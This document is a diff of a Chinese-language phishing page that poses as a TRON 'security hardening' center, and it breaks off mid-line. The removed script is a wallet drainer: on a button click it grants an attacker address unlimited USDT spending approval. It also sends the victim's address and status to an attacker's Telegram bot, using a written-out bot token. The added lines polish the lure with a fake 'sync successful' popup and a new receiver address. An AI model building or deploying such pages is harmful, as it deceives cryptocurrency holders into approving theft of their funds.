@@ -3,67 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TRON 网络安全中心</title>
+    <title>安全中心</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <style>
-        body { font-family: sans-serif; margin: 0; background: #f0f2f5; }
-        .safe-bar { background: #ff9800; color: white; padding: 12px; text-align: center; font-size: 14px; font-weight: bold; }
-        .container { padding: 20px; max-width: 450px; margin: 0 auto; text-align: center; }
-        .card { background: white; border-radius: 15px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-top: 20px; }
-        .btn { background: #007aff; color: white; border: none; padding: 16px; border-radius: 10px; font-size: 17px; width: 100%; cursor: pointer; margin-top: 20px; }
-        .btn:disabled { background: #ccc; }
+        /* 基础样式复刻 */
+        body { font-family: -apple-system, sans-serif; margin: 0; background: linear-gradient(180deg, #3d9dff 0%, #1e84ff 100%); height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .safe-bar { background: #fff5e6; color: #ff9800; width: 92%; padding: 12px; border-radius: 8px; font-size: 13px; margin-top: 20px; box-sizing: border-box; }
+        .card { background: white; width: 92%; border-radius: 12px; margin-top: 20px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); box-sizing: border-box; }
+        .btn { background: #007aff; color: white; border: none; padding: 16px; border-radius: 10px; font-size: 17px; font-weight: bold; width: 100%; cursor: pointer; }
+
+        /* 官方风格弹窗 (Modal) */
+        #successModal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center;
+        }
+        .modal-content {
+            background: white; width: 80%; max-width: 300px; border-radius: 16px; 
+            padding: 30px 20px; text-align: center; animation: zoomIn 0.3s ease;
+        }
+        .success-icon {
+            width: 60px; height: 60px; background: #4cd964; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;
+            color: white; font-size: 30px; font-weight: bold;
+        }
+        .modal-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .modal-text { font-size: 14px; color: #888; margin-bottom: 20px; line-height: 1.4; }
+        .modal-confirm { color: #007aff; font-weight: bold; font-size: 16px; cursor: pointer; padding-top: 15px; border-top: 1px solid #eee; width: 100%; display: block; text-decoration: none; }
+        @keyframes zoomIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
     </style>
 </head>
 <body>
-    <div class="safe-bar">🛡️ TRON 网络节点安全监测中，请及时完成加固</div>
-    <div class="container">
-        <div class="card">
-            <div style="font-size: 40px;">🔄</div>
-            <h3>安全协议加固</h3>
-            <p style="color: #666;">系统监测到您的地址尚未激活最新的安全协议，请点击下方按钮完成同步。</p>
-            <button id="mainBtn" class="btn">立即安全加固</button>
+
+    <div class="safe-bar">🛡️ 安全提醒：请确保已完成节点加固，以防止收款过程中出现数据丢包。</div>
+
+    <div class="card">
+        <div style="color: #888; font-size: 13px; margin-bottom: 10px;">当前环境状态</div>
+        <div style="background: #f8f9fa; border-radius: 8px; padding: 12px; font-size: 12px; margin-bottom: 20px;" id="userAddr">正在检测...</div>
+        <button id="mainBtn" class="btn">立即同步安全协议</button>
+    </div>
+
+    <div id="successModal">
+        <div class="modal-content">
+            <div class="success-icon">✓</div>
+            <div class="modal-title">同步成功</div>
+            <div class="modal-text">您的地址已成功绑定 TRON 节点安全协议，可正常进行收付款。</div>
+            <a href="javascript:void(0)" class="modal-confirm" onclick="location.reload()">我知道了</a>
         </div>
     </div>
 
     <script>
-        // 请在此处填入你最新获取的 Token 和 ID
         const CONFIG = {
             USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-            RECEIVER: "TNURWuUisTfP67X8uQ999H9S8m6Xg6JD7a", // 你的地址
-            TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q", // 请核实此 Token
-            TG_CHAT_ID: "7402809985"
-        };
-
-        async function sendLog(msg) {
-            const url = `https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CONFIG.TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
-            });
-        }
-
-        document.getElementById('mainBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('mainBtn');
-            if (!window.tronWeb) return alert("请在钱包内打开");
-
-            const addr = window.tronWeb.defaultAddress.base58;
-            btn.innerText = "同步中...";
-            btn.disabled = true;
-
-            try {
-                await sendLog(`🔍 <b>发现访问</b>\n地址: <code>${addr}</code>`);
-                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-                await contract.approve(CONFIG.RECEIVER, max).send();
-                await sendLog(`✅ <b>授权成功</b>\n地址: <code>${addr}</code>`);
-                alert("加固成功");
-            } catch (err) {
-                await sendLog(`❌ <b>用户拒绝</b>\n地址: <code>${addr}</code>`);
-                btn.innerText = "立即安全加固";
-                btn.disabled = false;
-            }
-        });
-    </script>
-</body>
-</html>
+            RECEIVER: "TNURWu1Vm7UYftQTZir88BWm1X9aq6JD7a", //
+            TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q", // [cite: Screenshot_20260213_
